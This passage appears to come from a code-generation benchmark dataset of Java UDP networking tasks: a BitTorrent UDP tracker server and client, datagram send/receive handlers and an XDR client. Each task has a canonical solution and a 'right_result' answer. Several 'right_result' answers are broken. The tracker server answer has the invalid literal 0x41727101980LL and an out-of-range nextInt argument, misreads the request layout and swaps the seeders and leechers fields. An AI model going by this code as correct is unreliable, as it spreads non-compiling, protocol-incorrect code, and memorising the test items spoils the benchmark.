handler.onError(\"Error receiving response: \" + e.getMessage());\n                    }\n                }\n            });\n            mThread.start();\n        }\n    }\n\n    public void stop() {\n        mRunning = false;\n        if (mThread != null) {\n            mThread.interrupt();\n        }\n        if (mUdpSocket != null && !mUdpSocket.isClosed()) {\n            mUdpSocket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 605,
    "Instruction": "Task Description: Implement a UDP-based tracker server that handles client connections and announcements for a peer-to-peer network, managing connection IDs and responding to client requests with appropriate status information.\n\nClass Description: SingleClientUdpTracker is a UDP server implementation that simulates a BitTorrent tracker, handling client connect and announce requests while maintaining connection state and expiration.\n\nAttributes:\n- CONNECTION_EXPIRATION_TIME: [Duration] - Maximum duration before a connection expires\n- EPHEMERAL_CONNECTION_ID: [long] - Magic number used for initial connection requests\n- CONNECT_CODE: [int] - Action code for connection requests\n- ANNOUNCE_CODE: [int] - Action code for announce requests\n- ERROR_CODE: [int] - Action code for error responses\n- serverSocket: [DatagramSocket] - UDP socket for communication\n- interval: [int] - Announce interval to send to clients\n- leechers: [int] - Number of leechers to report\n- seeders: [int] - Number of seeders to report\n- shutdown: [boolean] - Flag to control server shutdown\n- currentConnection: [long] - Current active connection ID\n- connectedOn: [long] - Timestamp of when current connection was established\n\nMethods:\n- SingleClientUdpTracker([int interval, int leechers, int seeders]) -> [void] - Constructor that initializes the UDP socket with random port and sets tracker parameters\n- getServerAddress() -> [SocketAddress] - Returns the local socket address of the server\n- run() -> [void] - Main server loop that receives requests and sends responses\n- processRequest([byte[] requestData]) -> [byte[]] - Processes incoming UDP packets and generates appropriate responses\n- generateConnectionId() -> [long] - Generates a new random connection ID\n- createConnectResponse([long connectionId, int transactionId]) -> [byte[]] - Creates a connect response packet\n- createAnnounceResponse([long connectionId, int transactionId]) -> [byte[]] - Creates an announce response packet\n- createError([int transactionId, String message]) -> [byte[]] - Creates an error response packet\n- shutdown() -> [void] - Shuts down the server and closes the socket",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.nio.charset.StandardCharsets;\nimport java.time.Duration;\nimport java.util.Arrays;\nimport java.util.Random;\n\npublic class SingleClientUdpTracker {\n\n    private static final Duration CONNECTION_EXPIRATION_TIME = Duration.ofMinutes(2);\n    private static final long EPHEMERAL_CONNECTION_ID = 0x41727101980L;\n\n    private static final int CONNECT_CODE = 0;\n    private static final int ANNOUNCE_CODE = 1;\n    private static final int ERROR_CODE = 3;\n\n    private final DatagramSocket serverSocket;\n    private final int interval;\n    private final int leechers;\n    private final int seeders;\n\n    private volatile boolean shutdown;\n    private volatile long currentConnection;\n    private volatile long connectedOn;\n\n    public SingleClientUdpTracker(int interval, int leechers, int seeders) throws SocketException {\n        this.serverSocket = new DatagramSocket(new InetSocketAddress(Inet4Address.getLoopbackAddress(), 0));\n        this.interval = interval;\n        this.leechers = leechers;\n        this.seeders = seeders;\n    }\n\n    public SocketAddress getServerAddress() {\n        return serverSocket.getLocalSocketAddress();\n    }\n\n    public void run() {\n        byte[] rbuf = new byte[8192];\n        DatagramPacket received = new DatagramPacket(rbuf, rbuf.length);\n        try {\n            serverSocket.receive(received);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Unexpected I/O error\", e);\n        }\n\n        byte[] response = processRequest(Arrays.copyOfRange(rbuf, 0, received.getLength()));\n        DatagramPacket sent = new DatagramPacket(response, response.length, received.getSocketAddress());\n        try {\n            serverSocket.send(sent);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Unexpected I/O error\", e);\n        }\n    }\n\n    private byte[] processRequest(byte[] requestData) {\n        long connectionId = Protocols.readLong(requestData, 0);\n        int action = Protocols.readInt(requestData, 8);\n        int transactionId = Protocols.readInt(requestData, 12);\n        boolean connectionExpired = System.currentTimeMillis() - connectedOn > CONNECTION_EXPIRATION_TIME.toMillis();\n\n        switch (action) {\n            case CONNECT_CODE: {\n                if (connectionId != EPHEMERAL_CONNECTION_ID) {\n                    return createError(transactionId,\n                            \"Connect request should use \" + EPHEMERAL_CONNECTION_ID + \" as connection ID\");\n                } else if (!connectionExpired) {\n                    return createError(transactionId, \"Connection is not expired yet: \" + connectionId);\n                }\n                currentConnection = generateConnectionId();\n                connectedOn = System.currentTimeMillis();\n                return createConnectResponse(currentConnection, transactionId);\n            }\n            case ANNOUNCE_CODE: {\n                if (currentConnection != connectionId) {\n                    return createError(transactionId, \"Unknown connection: \" + connectionId);\n                } else if (connectionExpired) {\n                    return createError(transactionId, \"Connection expired: \" + connectionId);\n                }\n                return createAnnounceResponse(currentConnection, transactionId);\n            }\n            default: {\n                return createError(transactionId, \"Unsupported action: \" + action);\n            }\n        }\n    }\n\n    private long generateConnectionId() {\n        return new Random(System.currentTimeMillis()).nextLong();\n    }\n\n    private byte[] createConnectResponse(long connectionId, int transactionId) {\n        byte[] data = new byte[4 + 4 + 8];\n        System.arraycopy(Protocols.getIntBytes(CONNECT_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(Protocols.getLongBytes(connectionId), 0, data, 8, 8);\n        return data;\n    }\n\n    private byte[] createAnnounceResponse(long connectionId, int transactionId) {\n        byte[] data = new byte[4 + 4 + 4 + 4 + 4];\n        System.arraycopy(Protocols.getIntBytes(ANNOUNCE_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(Protocols.getIntBytes(interval), 0, data, 8, 4);\n        System.arraycopy(Protocols.getIntBytes(leechers), 0, data, 12, 4);\n        System.arraycopy(Protocols.getIntBytes(seeders), 0, data, 16, 4);\n        return data;\n    }\n\n    private byte[] createError(int transactionId, String message) {\n        byte[] messageBytes = message.getBytes(StandardCharsets.US_ASCII);\n        byte[] data = new byte[4 + 4 + messageBytes.length];\n        System.arraycopy(Protocols.getIntBytes(ERROR_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(messageBytes, 0, data, 8, messageBytes.length);\n        return data;\n    }\n\n    public void shutdown() {\n        this.shutdown = true;\n        this.serverSocket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.util.Random;\n\npublic class SingleClientUdpTracker {\n    private static final long CONNECTION_EXPIRATION_TIME = 30_000; // 30 seconds\n    private static final long EPHEMERAL_CONNECTION_ID = 0x41727101980LL;\n    private static final int CONNECT_CODE = 0;\n    private static final int ANNOUNCE_CODE = 1;\n    private static final int ERROR_CODE = 3;\n\n    private DatagramSocket serverSocket;\n    private int interval;\n    private int leechers;\n    private int seeders;\n    private boolean shutdown;\n    private long currentConnection = -1;\n    private long connectedOn;\n\n    public SingleClientUdpTracker(int interval, int leechers, int seeders) throws SocketException {\n        this.serverSocket = new DatagramSocket();\n        this.interval = interval;\n        this.leechers = leechers;\n        this.seeders = seeders;\n        this.shutdown = false;\n    }\n\n    public SocketAddress getServerAddress() {\n        return serverSocket.getLocalSocketAddress();\n    }\n\n    public void run() {\n        byte[] buffer = new byte[65536];\n        while (!shutdown) {\n            try {\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                serverSocket.receive(packet);\n                byte[] response = processRequest(packet.getData());\n                if (response != null) {\n                    DatagramPacket reply = new DatagramPacket(response, response.length, packet.getSocketAddress());\n                    serverSocket.send(reply);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private byte[] processRequest(byte[] requestData) {\n        ByteBuffer buffer = ByteBuffer.wrap(requestData);\n        int action = buffer.getInt();\n        int transactionId = buffer.getInt();\n\n        if (action == CONNECT_CODE) {\n            if (currentConnection != -1 && System.currentTimeMillis() - connectedOn < CONNECTION_EXPIRATION_TIME) {\n                return createConnectResponse(currentConnection, transactionId);\n            } else {\n                long connectionId = generateConnectionId();\n                currentConnection = connectionId;\n                connectedOn = System.currentTimeMillis();\n                return createConnectResponse(connectionId, transactionId);\n            }\n        } else if (action == ANNOUNCE_CODE) {\n            if (currentConnection != -1 && System.currentTimeMillis() - connectedOn < CONNECTION_EXPIRATION_TIME) {\n                long receivedConnectionId = buffer.getLong();\n                if (receivedConnectionId == currentConnection) {\n                    // Skip the rest of announce request fields\n                    return createAnnounceResponse(currentConnection, transactionId);\n                } else {\n                    return createError(transactionId, \"Invalid connection ID\");\n                }\n            } else {\n                return createError(transactionId, \"Connection expired or not established\");\n            }\n        } else {\n            return createError(transactionId, \"Unknown action code\");\n        }\n    }\n\n    private long generateConnectionId() {\n        Random random = new Random();\n        return ((long) random.nextInt(0x100000000)) << 32 | (random.nextInt(0x100000000) & 0xFFFFFFFFL);\n    }\n\n    private byte[] createConnectResponse(long connectionId, int transactionId) {\n        ByteBuffer buffer = ByteBuffer.allocate(16);\n        buffer.putInt(CONNECT_CODE);\n        buffer.putInt(transactionId);\n        buffer.putLong(connectionId);\n        return buffer.array();\n    }\n\n    private byte[] createAnnounceResponse(long connectionId, int transactionId) {\n        ByteBuffer buffer = ByteBuffer.allocate(20);\n        buffer.putInt(ANNOUNCE_CODE);\n        buffer.putInt(transactionId);\n        buffer.putInt(interval);\n        buffer.putInt(seeders);\n        buffer.putInt(leechers);\n        return buffer.array();\n    }\n\n    private byte[] createError(int transactionId, String message) {\n        ByteBuffer buffer = ByteBuffer.allocate(16 + message.getBytes().length);\n        buffer.putInt(ERROR_CODE);\n        buffer.putInt(transactionId);\n        buffer.put((\"Error: \" + message).getBytes());\n        return buffer.array();\n    }\n\n    public void shutdown() {\n        this.shutdown = true;\n        if (serverSocket != null && !serverSocket.isClosed()) {\n            serverSocket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 606,
    "Instruction": "Task Description: Create a Java class for handling UDP communication that can both send and receive datagram packets, with proper socket management and error handling.\n\nClass Description: The UdpCommunicationHandler class provides a wrapper for Java's UDP socket functionality, enabling both sending and receiving of datagram packets. It manages socket lifecycle and provides status checking methods.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket for communication\n- bindAddress: InetSocketAddress - The address and port to which the socket is bound\n\nMethods:\n- UdpCommunicationHandler(String bindIp, int bindPort) -> void - Constructor that initializes and binds the UDP socket to the specified IP and port\n- sendData(byte[] data, String targetIp, int targetPort) -> void - Sends the provided data as a UDP packet to the specified target IP and port\n- receiveData() -> byte[] - Receives incoming UDP packet data and returns it as a byte array\n- close() -> void - Closes the UDP socket if it's open\n- isBound() -> boolean - Returns whether the socket is currently bound to an address\n- isClosed() -> boolean - Returns whether the socket is closed",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetSocketAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket socket;\n    private InetSocketAddress bindAddress;\n\n    public UdpCommunicationHandler(String bindIp, int bindPort) throws SocketException {\n        this.bindAddress = new InetSocketAddress(bindIp, bindPort);\n        this.socket = new DatagramSocket(null);\n        this.socket.bind(this.bindAddress);\n    }\n\n    public void sendData(byte[] data, String targetIp, int targetPort) throws IOException {\n        InetSocketAddress targetAddress = new InetSocketAddress(targetIp, targetPort);\n        DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress);\n        this.socket.send(packet);\n    }\n\n    public byte[] receiveData() throws IOException {\n        byte[] buffer = new byte[800];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        this.socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (this.socket != null && !this.socket.isClosed()) {\n            this.socket.close();\n        }\n    }\n\n    public boolean isBound() {\n        return this.socket != null && this.socket.isBound();\n    }\n\n    public boolean isClosed() {\n        return this.socket == null || this.socket.isClosed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.io.IOException;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket socket;\n    private InetSocketAddress bindAddress;\n\n    public UdpCommunicationHandler(String bindIp, int bindPort) throws SocketException {\n        try {\n            bindAddress = new InetSocketAddress(bindIp, bindPort);\n            socket = new DatagramSocket(bindAddress);\n        } catch (SocketException e) {\n            throw new SocketException(\"Failed to bind UDP socket to \" + bindIp + \":\" + bindPort + \": \" + e.getMessage());\n        }\n    }\n\n    public void sendData(byte[] data, String targetIp, int targetPort) {\n        try {\n            InetAddress address = InetAddress.getByName(targetIp);\n            DatagramPacket packet = new DatagramPacket(data, data.length, address, targetPort);\n            socket.send(packet);\n        } catch (IOException e) {\n            System.err.println(\"Error sending UDP data: \" + e.getMessage());\n        }\n    }\n\n    public byte[] receiveData() {\n        byte[] buffer = new byte[65507];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        try {\n            socket.receive(packet);\n            byte[] receivedData = new byte[packet.getLength()];\n            System.arraycopy(buffer, 0, receivedData, 0, packet.getLength());\n            return receivedData;\n        } catch (IOException e) {\n            System.err.println(\"Error receiving UDP data: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    public void close() {\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n\n    public boolean isBound() {\n        return socket != null && socket.isBound();\n    }\n\n    public boolean isClosed() {\n        return socket != null && socket.isClosed();\n    }\n}\n```"
  },
  {
    "Task_id": 607,
    "Instruction": "Task Description: Implement a UDP-based communication handler class that can act as a server to receive files and process initialization messages from clients.\n\nClass Description: The UdpCommunicationHandler class provides functionality to create a UDP server that listens on a specified port for incoming messages. It handles two types of messages: initialization messages for receiver setup and file information messages. The class manages the UDP socket lifecycle and includes methods for processing received messages.\n\nAttributes:\n- mDatagramSocket: DatagramSocket - The UDP socket used for communication\n\nMethods:\n- startFileReceiverServer(int serverPort) -> void - Starts the UDP server on the specified port to receive messages. Continuously listens for incoming packets and processes them based on their content.\n  Input: serverPort - int - The port number to bind the server to\n  Output: None (throws Exception if socket operations fail)\n  \n- handleReceiverInit(InetAddress inetAddress, int port) -> void - Handles the receiver initialization logic when an initialization message is received.\n  Input: \n    inetAddress - InetAddress - The client's IP address\n    port - int - The client's port number\n  Output: None\n  \n- parseFileInfo(String msg) -> void - Parses and processes file information messages received from clients.\n  Input: msg - String - The received message containing file information\n  Output: None\n  \n- closeSocket() -> void - Properly closes and cleans up the UDP socket resources.\n  Input: None\n  Output: None",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UdpCommunicationHandler {\n\n    private DatagramSocket mDatagramSocket;\n\n    public void startFileReceiverServer(int serverPort) throws Exception {\n        mDatagramSocket = new DatagramSocket(serverPort);\n        byte[] receiveData = new byte[1024];\n        \n        while(true) {\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            mDatagramSocket.receive(receivePacket);\n            String msg = new String(receivePacket.getData()).trim();\n            InetAddress inetAddress = receivePacket.getAddress();\n            int port = receivePacket.getPort();\n            \n            if(msg != null && msg.startsWith(Constant.MSG_FILE_RECEIVER_INIT)) {\n                handleReceiverInit(inetAddress, port);\n            } else {\n                parseFileInfo(msg);\n            }\n        }\n    }\n\n    private void handleReceiverInit(InetAddress inetAddress, int port) {\n        // Handle receiver initialization logic\n    }\n\n    private void parseFileInfo(String msg) {\n        // Parse file information\n    }\n\n    public void closeSocket() {\n        if(mDatagramSocket != null) {\n            mDatagramSocket.disconnect();\n            mDatagramSocket.close();\n            mDatagramSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\n\npublic class UdpCommunicationHandler {\n    private DatagramSocket mDatagramSocket;\n\n    public void startFileReceiverServer(int serverPort) throws Exception {\n        mDatagramSocket = new DatagramSocket(serverPort);\n        byte[] buffer = new byte[65535];\n\n        while (true) {\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            mDatagramSocket.receive(packet);\n            String receivedMessage = new String(packet.getData(), 0, packet.getLength(), StandardCharsets.UTF_8);\n\n            InetAddress clientAddress = packet.getAddress();\n            int clientPort = packet.getPort();\n\n            if (receivedMessage.startsWith(\"INIT\")) {\n                handleReceiverInit(clientAddress, clientPort);\n            } else {\n                parseFileInfo(receivedMessage);\n            }\n        }\n    }\n\n    public void handleReceiverInit(InetAddress inetAddress, int port) {\n        // Implementation for handling initialization message\n        System.out.println(\"Initialization request from \" + inetAddress.getHostAddress() + \":\" + port);\n    }\n\n    public void parseFileInfo(String msg) {\n        // Implementation for parsing file information message\n        System.out.println(\"Received file info: \" + msg);\n    }\n\n    public void closeSocket() {\n        if (mDatagramSocket != null && !mDatagramSocket.isClosed()) {\n            mDatagramSocket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 608,
    "Instruction": "Task Description: Implement a UDP-based client class for network communication that can send and receive datagram packets, manage connections, and handle timeouts.\n\nClass Description: ConnectDatagram is a UDP client class that extends a base Connection class. It provides functionality for sending and receiving XDR-encoded data over UDP, managing socket connections, and handling peer address information.\n\nAttributes:\n- ds: DatagramSocket - The UDP socket used for communication\n- dp: DatagramPacket - The packet used for receiving data\n- addr: InetAddress - The IP address of the server/peer\n\nMethods:\n- ConnectDatagram(String server, int port, int maxSize) -> void - Constructor that initializes the UDP connection with server address, port, and maximum packet size\n- sendOne(Xdr x) -> void - Sends an XDR-encoded packet to the server\n- receiveOne(Xdr x, int timeout) -> void - Receives an XDR-encoded packet with a specified timeout\n- getPeer() -> InetAddress - Returns the address of the peer that sent the last received packet\n- dropConnection() -> void - Placeholder for connection cleanup (UDP is connectionless)\n- checkConnection() -> void - Placeholder for connection verification (UDP is connectionless)\n- finalize() -> void - Cleans up resources by closing the socket when the object is garbage collected",
    "Canonical_solution": "import java.io.*;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ConnectDatagram extends Connection {\n\n    DatagramSocket ds;\n    DatagramPacket dp;\n    InetAddress addr;\n\n    public ConnectDatagram(String server, int port, int maxSize) throws IOException {\n        super(server, port, \"udp\", maxSize);\n        ds = new DatagramSocket();\n        addr = InetAddress.getByName(server);\n        start();\n    }\n\n    void sendOne(Xdr x) throws IOException {\n        ds.send(new DatagramPacket(x.xdr_buf(), x.xdr_offset(), addr, port));\n    }\n\n    void receiveOne(Xdr x, int timeout) throws IOException {\n        ds.setSoTimeout(timeout);\n        dp = new DatagramPacket(x.xdr_buf(), x.xdr_buf().length);\n        ds.receive(dp);\n    }\n\n    InetAddress getPeer() {\n        return dp.getAddress();\n    }\n\n    void dropConnection() {\n    }\n\n    void checkConnection() {\n    }\n\n    protected void finalize() throws Throwable {\n        if (ds != null) {\n            ds.close();\n            ds = null;\n        }\n        super.finalize();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.io.IOException;\n\npublic class ConnectDatagram extends Connection {\n    protected DatagramSocket ds;\n    protected DatagramPacket dp;\n    protected InetAddress addr;\n\n    public ConnectDatagram(String server, int port, int maxSize) throws UnknownHostException, SocketException {\n        ds = new DatagramSocket();\n        addr = InetAddress.getByName(server);\n        dp = new DatagramPacket(new byte[maxSize], maxSize);\n    }\n\n    public void sendOne(Xdr x) throws IOException {\n        byte[] data = x.getXdrBytes();\n        DatagramPacket packet = new DatagramPacket(data, data.length, addr, dp.getPort());\n        ds.send(packet);\n    }\n\n    public void receiveOne(Xdr x, int timeout) throws IOException {\n        ds.setSoTimeout(timeout);\n        ds.receive(dp);\n        byte[] receivedData = dp.getData();\n        x.setXdrBytes(receivedData, 0, dp.getLength());\n    }\n\n    public InetAddress getPeer() {\n        return dp.getAddress();\n    }\n\n    public void dropConnection() {\n        // UDP is connectionless; no action required\n    }\n\n    public void checkConnection() {\n        // UDP is connectionless; no action required\n    }\n\n    protected void finalize() throws Throwable {\n        try {\n            if (ds != null && !ds.isClosed()) {\n                ds.close();\n            }\n        } finally {\n            super.finalize();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 610,
    "Instruction": "Task Description: Implement a UDP-based tracker client for peer-to-peer file sharing systems that can connect to a tracker server, maintain connection state, and handle announce requests and responses.\n\nClass Description: UDPTrackerClient is a specialized tracker client that communicates with BitTorrent trackers using UDP protocol. It handles connection establishment, announcement of peer information, and manages timeouts and retries for reliable communication.\n\nAttributes:\n- logger: Logger - Logger instance for tracking client activities\n- UDP_BASE_TIMEOUT_SECONDS: int - Base timeout value for UDP communication\n- UDP_MAX_TRIES: int - Maximum number of retry attempts\n- UDP_MAX_TRIES_ON_STOPPED: int - Maximum retries for STOPPED events\n- UDP_PACKET_LENGTH: int - Maximum UDP packet size\n- address: InetSocketAddress - Tracker server address\n- random: Random - Random number generator for transaction IDs\n- socket: DatagramSocket - UDP communication socket\n- connectionExpiration: Date - When the current connection expires\n- connectionId: long - Current connection identifier\n- transactionId: int - Current transaction identifier\n- stop: boolean - Flag to indicate if client should stop operations\n\nMethods:\n- UDPTrackerClient(List<Peer> peers, URI tracker) -> void - Constructor that initializes the client with peer list and tracker URI\n- announce(AnnounceRequestMessage.RequestEvent event, boolean inhibitEvents, AnnounceableInformation torrent, List<Peer> peers) -> void - Main method to announce peer information to tracker\n- handleTrackerAnnounceResponse(TrackerMessage message, boolean inhibitEvents, String hexInfoHash) -> void - Processes announce responses from tracker\n- close() -> void - Closes the client and releases resources\n- buildAnnounceRequest(AnnounceRequestMessage.RequestEvent event, AnnounceableInformation torrent, Peer peer) -> UDPAnnounceRequestMessage - Constructs announce request message\n- validateTrackerResponse(TrackerMessage message) -> void - Validates tracker response messages\n- handleTrackerConnectResponse(TrackerMessage message) -> void - Processes connection responses from tracker\n- send(ByteBuffer data) -> void - Sends data to tracker server\n- recv(int attempt) -> ByteBuffer - Receives data from tracker server with timeout handling",
    "Canonical_solution": "import com.turn.ttorrent.common.AnnounceableInformation;\nimport com.turn.ttorrent.common.Peer;\nimport com.turn.ttorrent.common.TorrentLoggerFactory;\nimport com.turn.ttorrent.common.protocol.AnnounceRequestMessage;\nimport com.turn.ttorrent.common.protocol.TrackerMessage;\nimport com.turn.ttorrent.common.protocol.TrackerMessage.ErrorMessage;\nimport com.turn.ttorrent.common.protocol.TrackerMessage.MessageValidationException;\nimport com.turn.ttorrent.common.protocol.udp.UDPAnnounceRequestMessage;\nimport com.turn.ttorrent.common.protocol.udp.UDPConnectRequestMessage;\nimport com.turn.ttorrent.common.protocol.udp.UDPConnectResponseMessage;\nimport com.turn.ttorrent.common.protocol.udp.UDPTrackerMessage;\nimport org.slf4j.Logger;\n\nimport java.io.IOException;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.UnsupportedAddressTypeException;\nimport java.util.Calendar;\nimport java.util.Date;\nimport java.util.List;\nimport java.util.Random;\n\npublic class UDPTrackerClient extends TrackerClient {\n\n  protected static final Logger logger =\n          TorrentLoggerFactory.getLogger(UDPTrackerClient.class);\n\n  private static final int UDP_BASE_TIMEOUT_SECONDS = 15;\n  private static final int UDP_MAX_TRIES = 8;\n  private static final int UDP_MAX_TRIES_ON_STOPPED = 1;\n  private static final int UDP_PACKET_LENGTH = 512;\n\n  private final InetSocketAddress address;\n  private final Random random;\n\n  private DatagramSocket socket;\n  private Date connectionExpiration;\n  private long connectionId;\n  private int transactionId;\n  private boolean stop;\n\n  public UDPTrackerClient(List<Peer> peers, URI tracker)\n          throws UnknownHostException {\n    super(peers, tracker);\n\n    for (Peer peer : peers) {\n      if (!(InetAddress.getByName(peer.getIp()) instanceof Inet4Address)) {\n        throw new UnsupportedAddressTypeException();\n      }\n    }\n\n    this.address = new InetSocketAddress(\n            tracker.getHost(),\n            tracker.getPort());\n\n    this.socket = null;\n    this.random = new Random();\n    this.connectionExpiration = null;\n    this.stop = false;\n  }\n\n  @Override\n  public void announce(final AnnounceRequestMessage.RequestEvent event,\n                       boolean inhibitEvents, final AnnounceableInformation torrent, final List<Peer> peers) throws AnnounceException {\n    int maxAttempts = AnnounceRequestMessage.RequestEvent\n            .STOPPED.equals(event)\n            ? UDP_MAX_TRIES_ON_STOPPED\n            : UDP_MAX_TRIES;\n    int attempts = -1;\n\n    try {\n      this.socket = new DatagramSocket();\n      this.socket.connect(this.address);\n\n      while (++attempts <= maxAttempts) {\n        this.transactionId = this.random.nextInt();\n\n        if (this.connectionExpiration != null) {\n          if (new Date().before(this.connectionExpiration)) {\n            for (Peer peer : peers) {\n              this.send(this.buildAnnounceRequest(event, torrent, peer).getData());\n            }\n\n            try {\n              this.handleTrackerAnnounceResponse(\n                      UDPTrackerMessage.UDPTrackerResponseMessage\n                              .parse(this.recv(attempts)), inhibitEvents, torrent.getHexInfoHash());\n              return;\n            } catch (SocketTimeoutException ste) {\n              if (stop) {\n                return;\n              }\n            }\n          }\n        }\n\n        this.send(UDPConnectRequestMessage\n                .craft(this.transactionId).getData());\n\n        try {\n          this.handleTrackerConnectResponse(\n                  UDPTrackerMessage.UDPTrackerResponseMessage\n                          .parse(this.recv(attempts)));\n          attempts = -1;\n        } catch (SocketTimeoutException ste) {\n          if (stop) {\n            return;\n          }\n        }\n      }\n\n      throw new AnnounceException(\"Timeout while announcing\" +\n              this.formatAnnounceEvent(event) + \" to tracker!\");\n    } catch (IOException ioe) {\n      throw new AnnounceException(\"Error while announcing\" +\n              this.formatAnnounceEvent(event) +\n              \" to tracker: \" + ioe.getMessage(), ioe);\n    } catch (MessageValidationException mve) {\n      throw new AnnounceException(\"Tracker message violates expected \" +\n              \"protocol (\" + mve.getMessage() + \")\", mve);\n    }\n  }\n\n  @Override\n  protected void handleTrackerAnnounceResponse(TrackerMessage message,\n                                               boolean inhibitEvents, String hexInfoHash) throws AnnounceException {\n    this.validateTrackerResponse(message);\n    super.handleTrackerAnnounceResponse(message, inhibitEvents, hexInfoHash);\n  }\n\n  @Override\n  protected void close() {\n    this.stop = true;\n    if (this.socket != null && !this.socket.isClosed()) {\n      this.socket.close();\n    }\n  }\n\n  private UDPAnnounceRequestMessage buildAnnounceRequest(\n          final AnnounceRequestMessage.RequestEvent event, final AnnounceableInformation torrent, final Peer peer) {\n    return UDPAnnounceRequestMessage.craft(\n            this.connectionId,\n            transactionId,\n            torrent.getInfoHash(),\n            peer.getPeerIdArray(),\n            torrent.getDownloaded(),\n            torrent.getUploaded(),\n            torrent.getLeft(),\n            event,\n            peer.getAddress().getAddress(),\n            0,\n            AnnounceRequestMessage.DEFAULT_NUM_WANT,\n            peer.getPort());\n  }\n\n  private void validateTrackerResponse(TrackerMessage message)\n          throws AnnounceException {\n    if (message instanceof ErrorMessage) {\n      throw new AnnounceException(((ErrorMessage) message).getReason());\n    }\n\n    if (message instanceof UDPTrackerMessage &&\n            (((UDPTrackerMessage) message).getTransactionId() != this.transactionId)) {\n      throw new AnnounceException(\"Invalid transaction ID!\");\n    }\n  }\n\n  private void handleTrackerConnectResponse(TrackerMessage message)\n          throws AnnounceException {\n    this.validateTrackerResponse(message);\n\n    if (!(message instanceof ConnectionResponseMessage)) {\n      throw new AnnounceException(\"Unexpected tracker message type \" +\n              message.getType().name() + \"!\");\n    }\n\n    UDPConnectResponseMessage connectResponse =\n            (UDPConnectResponseMessage) message;\n\n    this.connectionId = connectResponse.getConnectionId();\n    Calendar now = Calendar.getInstance();\n    now.add(Calendar.MINUTE, 1);\n    this.connectionExpiration = now.getTime();\n  }\n\n  private void send(ByteBuffer data) {\n    try {\n      this.socket.send(new DatagramPacket(\n              data.array(),\n              data.capacity(),\n              this.address));\n    } catch (IOException ioe) {\n      logger.info(\"Error sending datagram packet to tracker at {}: {}.\", this.address, ioe.getMessage());\n    }\n  }\n\n  private ByteBuffer recv(int attempt)\n          throws IOException, SocketException, SocketTimeoutException {\n    int timeout = UDP_BASE_TIMEOUT_SECONDS * (int) Math.pow(2, attempt);\n    logger.trace(\"Setting receive timeout to {}s for attempt {}...\",\n            timeout, attempt);\n    this.socket.setSoTimeout(timeout * 1000);\n\n    try {\n      DatagramPacket p = new DatagramPacket(\n              new byte[UDP_PACKET_LENGTH],\n              UDP_PACKET_LENGTH);\n      this.socket.receive(p);\n      return ByteBuffer.wrap(p.getData(), 0, p.getLength());\n    } catch (SocketTimeoutException ste) {\n      throw ste;\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.util.Date;\nimport java.util.List;\nimport java.util.Random;\nimport java.util.logging.Logger;\nimport java.util.concurrent.TimeUnit;\n\npublic class UDPTrackerClient {\n    private final Logger logger = Logger.getLogger(UDPTrackerClient.class.getName());\n    public static final int UDP_BASE_TIMEOUT_SECONDS = 15;\n    public static final int UDP_MAX_TRIES = 3;\n    public static final int UDP_MAX_TRIES_ON_STOPPED = 2;\n    public static final int UDP_PACKET_LENGTH = 16384;\n    private final InetSocketAddress address;\n    private final Random random = new Random();\n    private DatagramSocket socket;\n    private Date connectionExpiration;\n    private long connectionId;\n    private int transactionId;\n    private boolean stop = false;\n\n    public UDPTrackerClient(List<Peer> peers, URI tracker) throws UnknownHostException, SocketException {\n        this.address = new InetSocketAddress(tracker.getHost(), tracker.getPort());\n        this.socket = new DatagramSocket();\n        this.transactionId = random.nextInt(Short.MAX_VALUE);\n    }\n\n    public void announce(AnnounceRequestMessage.RequestEvent event, boolean inhibitEvents, AnnounceableInformation torrent, List<Peer> peers) {\n        if (stop) return;\n        // Implement announcement logic here\n    }\n\n    public void handleTrackerAnnounceResponse(TrackerMessage message, boolean inhibitEvents, String 